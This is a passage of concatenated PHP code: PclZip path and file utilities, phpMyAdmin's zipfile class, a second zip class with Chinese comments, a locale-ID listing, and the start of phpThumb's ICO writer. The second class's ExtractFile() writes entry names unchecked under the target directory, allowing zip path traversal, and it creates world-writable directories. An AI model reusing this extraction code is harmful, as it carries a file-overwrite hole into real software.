    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilPathInclusion", "dir='$p_dir', path='$p_path'");
    $v_result = 1;
    
    // ----- Look for path beginning by ./
    if (   ($p_dir == '.')
        || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
      $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Replacing ./ by full path in p_dir '".$p_dir."'");
    }
    if (   ($p_path == '.')
        || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
      $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Replacing ./ by full path in p_path '".$p_path."'");
    }

    // ----- Explode dir and path by directory separator
    $v_list_dir = explode("/", $p_dir);
    $v_list_dir_size = sizeof($v_list_dir);
    $v_list_path = explode("/", $p_path);
    $v_list_path_size = sizeof($v_list_path);

    // ----- Study directories paths
    $i = 0;
    $j = 0;
    while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Working on dir($i)='".$v_list_dir[$i]."' and path($j)='".$v_list_path[$j]."'");

      // ----- Look for empty dir (path reduction)
      if ($v_list_dir[$i] == '') {
        $i++;
        continue;
      }
      if ($v_list_path[$j] == '') {
        $j++;
        continue;
      }

      // ----- Compare the items
      if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Items ($i,$j) are different");
        $v_result = 0;
      }

      // ----- Next items
      $i++;
      $j++;
    }

    // ----- Look if everything seems to be the same
    if ($v_result) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Look for tie break");
      // ----- Skip all the empty items
      while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
      while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Looking on dir($i)='".($i < $v_list_dir_size?$v_list_dir[$i]:'')."' and path($j)='".($j < $v_list_path_size?$v_list_path[$j]:'')."'");

      if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
        // ----- There are exactly the same
        $v_result = 2;
      }
      else if ($i < $v_list_dir_size) {
        // ----- The path is shorter than the dir
        $v_result = 0;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilCopyBlock()
  // Description :
  // Parameters :
  //   $p_mode : read/write compression mode
  //             0 : src & dest normal
  //             1 : src gzip, dest normal
  //             2 : src normal, dest gzip
  //             3 : src & dest gzip
  // Return Values :
  // --------------------------------------------------------------------------------
  function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilCopyBlock", "size=$p_size, mode=$p_mode");
    $v_result = 1;

    if ($p_mode==0)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Src offset before read :".(@ftell($p_src)));
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Dest offset before write :".(@ftell($p_dest)));
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @fread($p_src, $v_read_size);
        @fwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Src offset after read :".(@ftell($p_src)));
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Dest offset after write :".(@ftell($p_dest)));
    }
    else if ($p_mode==1)
    {
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @gzread($p_src, $v_read_size);
        @fwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    }
    else if ($p_mode==2)
    {
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @fread($p_src, $v_read_size);
        @gzwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    }
    else if ($p_mode==3)
    {
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @gzread($p_src, $v_read_size);
        @gzwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilRename()
  // Description :
  //   This function tries to do a simple rename() function. If it fails, it
  //   tries to copy the $p_src file in a new $p_dest file and then unlink the
  //   first one.
  // Parameters :
  //   $p_src : Old filename
  //   $p_dest : New filename
  // Return Values :
  //   1 on success, 0 on failure.
  // --------------------------------------------------------------------------------
  function PclZipUtilRename($p_src, $p_dest)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilRename", "source=$p_src, destination=$p_dest");
    $v_result = 1;

    // ----- Try to rename the files
    if (!@rename($p_src, $p_dest)) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Fail to rename file, try copy+unlink");

      // ----- Try to copy & unlink the src
      if (!@copy($p_src, $p_dest)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Fail to copy file");
        $v_result = 0;
      }
      else if (!@unlink($p_src)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Fail to unlink old filename");
        $v_result = 0;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilOptionText()
  // Description :
  //   Translate option value in text. Mainly for debug purpose.
  // Parameters :
  //   $p_option : the option value.
  // Return Values :
  //   The option text value.
  // --------------------------------------------------------------------------------
  function PclZipUtilOptionText($p_option)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilOptionText", "option='".$p_option."'");
    
    $v_list = get_defined_constants();
    for (reset($v_list); $v_key = key($v_list); next($v_list)) {
          $v_prefix = substr($v_key, 0, 10);
          if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
              && ($v_list[$v_key] == $p_option)) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_key);
          return $v_key;
            }
    }
    
    $v_result = 'Unknown';

    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilTranslateWinPath()
  // Description :
  //   Translate windows path by replacing '\' by '/' and optionally removing
  //   drive letter.
  // Parameters :
  //   $p_path : path to translate.
  //   $p_remove_disk_letter : true | false
  // Return Values :
  //   The path translated.
  // --------------------------------------------------------------------------------
  function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
  {
    if (stristr(php_uname(), 'windows')) {
      // ----- Look for potential disk letter
      if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
          $p_path = substr($p_path, $v_position+1);
      }
      // ----- Change potential windows directory separator
      if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
          $p_path = strtr($p_path, '\\', '/');
      }
    }
    return $p_path;
  }
  // --------------------------------------------------------------------------------
?>

<?php 
/* $Id: zip.lib.php,v 2.4 2004/11/03 13:56:52 garvinhicking Exp $ */
// vim: expandtab sw=4 ts=4 sts=4:


/**
 * Zip file creation class.
 * Makes zip files.
 *
 * Based on :
 *
 *  http://www.zend.com/codex.php?id=535&single=1
 *  By Eric Mueller <eric@themepark.com>
 *
 *  http://www.zend.com/codex.php?id=470&single=1
 *  by Denis125 <webmaster@atlant.ru>
 *
 *  a patch from Peter Listiak <mlady@users.sourceforge.net> for last modified
 *  date and time of the compressed file
 *
 * Official ZIP file format: http://www.pkware.com/appnote.txt
 *
 * @access  public
 */
class zipfile
{
    /**
     * Array to store compressed data
     *
     * @var  array    $datasec
     */
    var $datasec      = array();

    /**
     * Central directory
     *
     * @var  array    $ctrl_dir
     */
    var $ctrl_dir     = array();

    /**
     * End of central directory record
     *
     * @var  string   $eof_ctrl_dir
     */
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";

    /**
     * Last offset position
     *
     * @var  integer  $old_offset
     */
    var $old_offset   = 0;


    /**
     * Converts an Unix timestamp to a four byte DOS date and time format (date
     * in high two bytes, time in low two bytes allowing magnitude comparison).
     *
     * @param  integer  the current Unix timestamp
     *
     * @return integer  the current date in a four byte DOS format
     *
     * @access private
     */
    function unix2DosTime($unixtime = 0) {
        error_reporting(0);
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        } // end if

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    } // end of the 'unix2DosTime()' method


    /**
     * Adds "file" to archive
     *
     * @param  string   file contents
     * @param  string   name of the file in the archive (may contains the path)
     * @param  integer  the current timestamp
     *
     * @access public
     */
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);

        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');

        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";            // ver needed to extract
        $fr   .= "\x00\x00";            // gen purpose bit flag
        $fr   .= "\x08\x00";            // compression method
        $fr   .= $hexdtime;             // last mod time and date

        // "local file header" segment
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2); // fix crc bug
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);             // crc32
        $fr      .= pack('V', $c_len);           // compressed filesize
        $fr      .= pack('V', $unc_len);         // uncompressed filesize
        $fr      .= pack('v', strlen($name));    // length of filename
        $fr      .= pack('v', 0);                // extra field length
        $fr      .= $name;

        // "file data" segment
        $fr .= $zdata;

        // "data descriptor" segment (optional but necessary if archive is not
        // served as file)
        // nijel(2004-10-19): this seems not to be needed at all and causes
        // problems in some cases (bug #1037737)
        //$fr .= pack('V', $crc);                 // crc32
        //$fr .= pack('V', $c_len);               // compressed filesize
        //$fr .= pack('V', $unc_len);             // uncompressed filesize

        // add this entry to array
        $this -> datasec[] = $fr;

        // now add to central directory record
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";                // version made by
        $cdrec .= "\x14\x00";                // version needed to extract
        $cdrec .= "\x00\x00";                // gen purpose bit flag
        $cdrec .= "\x08\x00";                // compression method
        $cdrec .= $hexdtime;                 // last mod time & date
        $cdrec .= pack('V', $crc);           // crc32
        $cdrec .= pack('V', $c_len);         // compressed filesize
        $cdrec .= pack('V', $unc_len);       // uncompressed filesize
        $cdrec .= pack('v', strlen($name) ); // length of filename
        $cdrec .= pack('v', 0 );             // extra field length
        $cdrec .= pack('v', 0 );             // file comment length
        $cdrec .= pack('v', 0 );             // disk number start
        $cdrec .= pack('v', 0 );             // internal file attributes
        $cdrec .= pack('V', 32 );            // external file attributes - 'archive' bit set

        $cdrec .= pack('V', $this -> old_offset ); // relative offset of local header
        $this -> old_offset += strlen($fr);

        $cdrec .= $name;

        // optional extra field, file comment goes here
        // save to central directory
        $this -> ctrl_dir[] = $cdrec;
    } // end of the 'addFile()' method


    /**
     * Dumps out file
     *
     * @return  string  the zipped file
     *
     * @access public
     */
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);

        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .  // total # of entries "on this disk"
            pack('v', sizeof($this -> ctrl_dir)) .  // total # of entries overall
            pack('V', strlen($ctrldir)) .           // size of central dir
            pack('V', strlen($data)) .              // offset to start of central dir
            "\x00\x00";                             // .zip file comment length
    } // end of the 'file()' method

} // end of the 'zipfile' class
?>

<?php 
////////////////////////ZIP类///////////////////////////////
class zip 
{

 var $datasec, $ctrl_dir = array();
 var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
 var $old_offset = 0; var $dirs = Array(".");

 function get_List($zip_name)
 {
   $zip = @fopen($zip_name, 'rb');
   if(!$zip) return(0);
   $centd = $this->ReadCentralDir($zip,$zip_name);

    @rewind($zip);
    @fseek($zip, $centd['offset']);

   for ($i=0; $i<$centd['entries']; $i++)
   {
    $header = $this->ReadCentralFileHeaders($zip);
    $header['index'] = $i;$info['filename'] = $header['filename'];
    $info['stored_filename'] = $header['stored_filename'];
    $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
    $info['crc'] = strtoupper(dechex( $header['crc'] ));
    $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
    $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
    $info['index'] = $header['index'];$info['status'] = $header['status'];
    $ret[]=$info; unset($header);
   }
  return $ret;
 }
 function Add($files,$compact)
 {
  if(!is_array($files[0])) $files=Array($files);

  for($i=0;$files[$i];$i++){
    $fn = $files[$i];
    if(!in_Array(dirname($fn[0]),$this->dirs))
     $this->add_Dir(dirname($fn[0]));
    if(basename1($fn[0]))
     $ret[basename1($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
  }
  return $ret;
 }

 function get_file()
 {
   $data = implode('', $this -> datasec);
   $ctrldir = implode('', $this -> ctrl_dir);

   return $data . $ctrldir . $this -> eof_ctrl_dir .
    pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 }

 function add_dir($name) 
 { 
   $name = str_replace("\\", "/", $name); 
   $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 

   $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 
   $this -> datasec[] = $fr;

   $new_offset = strlen(implode("", $this->datasec)); 

   $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
   $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
   $ext = "\xff\xff\xff\xff"; 
   $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name; 

   $this -> ctrl_dir[] = $cdrec; 
   $this -> old_offset = $new_offset; 
   $this -> dirs[] = $name;
 }

 function add_File($data, $name, $compact = 1)
 {
   $name     = str_replace('\\', '/', $name);
   $dtime    = dechex($this->DosTime());

   $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
     . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
   eval('$hexdtime = "' . $hexdtime . '";');

   if($compact)
   $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
   else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
   $unc_len = strlen($data); $crc = crc32($data);

   if($compact){
     $zdata = gzcompress($data); $c_len = strlen($zdata);
     $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
   }else{
     $zdata = $data;
   }
   $c_len=strlen($zdata);
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;

   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);

   $this -> datasec[] = $fr;
   $new_offset        = strlen(implode('', $this->datasec));
   if($compact)
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
   else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
   $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
   $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
   $cdrec .= pack('V', $this -> old_offset );

   $this -> old_offset = $new_offset;
   $cdrec .= $name;
   $this -> ctrl_dir[] = $cdrec;
   return true;
 }

 function DosTime() {
   $timearray = getdate();
   if ($timearray['year'] < 1980) {
     $timearray['year'] = 1980; $timearray['mon'] = 1;
     $timearray['mday'] = 1; $timearray['hours'] = 0;
     $timearray['minutes'] = 0; $timearray['seconds'] = 0;
   }
   return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) |     ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | 
    ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
 }

 function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
     if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
      return(-1);
   }

   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
      $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
      
   }
   fclose($zip);
   return $stat;
 }

  function ReadFileHeader($zip)
  { 
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }

 function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

    if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';

    if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';

    if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';

    if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }

 function ReadCentralDir($zip,$zip_name)
 {
  $size = filesize($zip_name);
  if ($size < 277) $maximum_size = $size;
  else $maximum_size=277;

  @fseek($zip, $size-$maximum_size);
  $pos = ftell($zip); $bytes = 0x00000000;

  while ($pos < $size)
  {
    $byte = @fread($zip, 1); $bytes=($bytes << 8) | Ord($byte);
    if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
  }

 $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));


  if ($data['comment_size'] != 0)
    $centd['comment'] = fread($zip, $data['comment_size']);
    else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
  $centd['disk_entries'] = $data['disk_entries'];
  $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
  $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
  return $centd;
 }

 function ExtractFile($header,$to,$zip)
 {
   $header = $this->readfileheader($zip);

   if(substr($to,-1)!="/") $to.="/";
   if(!@is_dir($to)) @mkdir($to,0777);

   $pth = explode("/",dirname($header['filename']));
   for($i=0;isset($pth[$i]);$i++){
     if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
     if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
   }
  if (!($header['external']==0x41FF0010)&&!($header['external']==16))
  {
   if ($header['compression']==0)
   {
    $fp = @fopen($to.$header['filename'], 'wb');
    if(!$fp) return(-1);
    $size = $header['compressed_size'];

    while ($size != 0)
    {
      $read_size = ($size < 2048 ? $size : 2048);
      $buffer = fread($zip, $read_size);
      $binary_data = pack('a'.$read_size, $buffer);
      @fwrite($fp, $binary_data, $read_size);
      $size -= $read_size;
    }
    fclose($fp);
    touch($to.$header['filename'], $header['mtime']);

  }else{
   $fp = @fopen($to.$header['filename'].'.gz','wb');
   if(!$fp) return(-1);
   $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
     Chr(0x00), time(), Chr(0x00), Chr(3));

   fwrite($fp, $binary_data, 10);
   $size = $header['compressed_size'];

   while ($size != 0)
   {
     $read_size = ($size < 1024 ? $size : 1024);
     $buffer = fread($zip, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }

   $binary_data = pack('VV', $header['crc'], $header['size']);
   fwrite($fp, $binary_data,8); fclose($fp);

   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compresse");
    if(!$gzp) return(-2);
   $fp = @fopen($to.$header['filename'],'wb');
   if(!$fp) return(-1);
   $size = $header['size'];

   while ($size != 0)
   {
     $read_size = ($size < 2048 ? $size : 2048);
     $buffer = gzread($gzp, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }
   fclose($fp); gzclose($gzp);

   touch($to.$header['filename'], $header['mtime']);
   @unlink($to.$header['filename'].'.gz');

  }}
  return true;
 }
} //ZIP压缩类end
?>

<?php 
function LCIDS(){
?>
Afrikaans (1078)
Albanian (1052)
Arabic - U.A.E. (14337)
Arabic - Bahrain (15361)
Arabic - Algeria (5121)
Arabic - Egypt (3073)
Arabic - Iraq (2049)
Arabic - Jordan (11265)
Arabic - Kuwait (13313)
Arabic - Lebanon (12289)
Arabic - Libya (4097)
Arabic - Morocco (6145)
Arabic - Oman (8193) 
Arabic - Qatar (16385)
Arabic - Saudia Arabia (1025)
Arabic - Syria (10241)
Arabic - Tunisia (7169)
Arabic - Yemen (9217)
Basque (1069)
Belarusian (1059)
Bulgarian (1026)
Catalan (1027)
Chinese - PRC (2052)
Chinese - Hong Kong (3076)
Chinese - Singapore (4100)
Chinese - Taiwan (1028)
Croatian (1050)
Czech (1029)
Danish (1030)
Dutch (1043)
Dutch  Belgium (2067)
English - Australia (3081)
English - Belize (10249)
English - Canada (4105)
English - Ireland (6153)
English - Jamaica (8201)
English - New Zealand (5129)
English - South Africa (7177)
English - Trinidad (11273)
English - United Kingdom (2057)
English - United States (1033)
Estonian (1061)
Farsi (1065)
Finnish (1035)
Faeroese (1080)
French - Standard (1036)
French - Belgium (2060)
French - Canada (3084)
French - Luxembourg (5132)
French - Switzerland (4108)
Gaelic Scotland (1084)
German - Standard (1031)
German - Austrian (3079)
German - Lichtenstein (5127)
German - Luxembourg (4103)
German - Switzerland (2055)
Greek (1032)
Hebrew (1037)
Hindi (1081)
Hungarian (1038)
Icelandic (1039)
Indonesian (1057)
Italian Standard (1040)
Italian Switzerland (2064)
Japanese (1041)
Korean (1042)
Latvian (1062)
Lithuanian (1063)
Macedonian (1071)
Malay Malaysia (1086)
Maltese (1082)
Norwegian  Bokml (1044)
Polish (1045)
Portuguese Standard (2070)
Portuguese Brazil (1046)
RaetoRomance (1047)
Romanian (1048)
Romanian Moldova (2072)
Russian (1049)
Russian Moldova (2073)
Serbian Cyrillic (3098)
Setsuana (1074)
Slovenian (1060)
Slovak (1051)
Sorbian (1070)
Spanish - Standard (1034)
Spanish - Argentina (11274)
Spanish - Bolivia (16394)
Spanish - Chile (13322)
Spanish - Columbia (9226)
Spanish - Costa Rica (5130)
Spanish - Dominican Republic (7178)
Spanish - Ecuador (12298)
Spanish - Guatemala (4106)
Spanish - Honduras (18442)
Spanish - Mexico (2058)
Spanish - Nicaragua (19466)
Spanish - Panama (6154)
Spanish - Peru (10250)
Spanish - Puerto Rico (20490)
Spanish - Paraguay (15370)
Spanish - El Salvador (17418)
Spanish - Uruguay (14346)
Spanish - Venezuela (8202)
Sutu (1072)
Swedish (1053)
Swedish - Finland (2077)
Thai (1054)
Turkish (1055)
Tsonga (1073)
Ukranian (1058)
Urdu Pakistan (1056)
Vietnamese (1066)
Xhosa (1076)
Yiddish (1085)
Zulu (1077)
<?php 
exit;
}
?>

<?php  
////////////////////////////////////////////////////////////// 
///  phpThumb() by James Heinrich <info@silisoftware.com>   // 
//        available at http://phpthumb.sourceforge.net     /// 
////////////////////////////////////////////////////////////// 
///                                                         // 
// phpthumb.ico.php - .ICO output format functions          // 
//                                                         /// 
////////////////////////////////////////////////////////////// 
class phpthumb_ico { 
    function phpthumb_ico() { 
        return true; 
    } 
    function GD2ICOstring(&$gd_image_array) { 
        foreach ($gd_image_array as $key => $gd_image) { 
            $ImageWidths[$key]  = ImageSX($gd_image); 
            $ImageHeights[$key] = ImageSY($gd_image); 
            $bpp[$key]          = ImageIsTrueColor($gd_image) ? 32 : 24; 
            $totalcolors[$key]  = ImageColorsTotal($gd_image); 
            $icXOR[$key] = ''; 
            for ($y = $ImageHeights[$key] - 1; $y >= 0; $y--) { 
                for ($x = 0; $x < $ImageWidths[$key]; $x++) { 
                    $argb = $this->GetPixelColor($gd_image, $x, $y); 
                    $a = round(255 * ((127 - $argb['alpha']) / 127)); 
                    $r = $argb['red']; 
                    $g = $argb['green']; 
                    $b = $argb['blue']; 
                    if ($bpp[$key] == 32) { 
                        $icXOR[$key] .= chr($b).chr($g).chr($r).chr($a); 
                    } elseif ($bpp[$key] == 24) { 
                        $icXOR[$key] .= chr($b).chr($g).chr($r); 
                    } 
                    if ($a < 128) { 
                        @$icANDmask[$key][$y] .= '1'; 
                    } else { 
                        @$icANDmask[$key][$y] .= '0'; 
                    } 
                } 
                // mask bits are 32-bit aligned per scanline 
                while (strlen($icANDmask[$key][$y]) % 32) { 
                    $icANDmask[$key][$y] .= '0'; 
                } 
            } 
            $icAND[$key] = ''; 
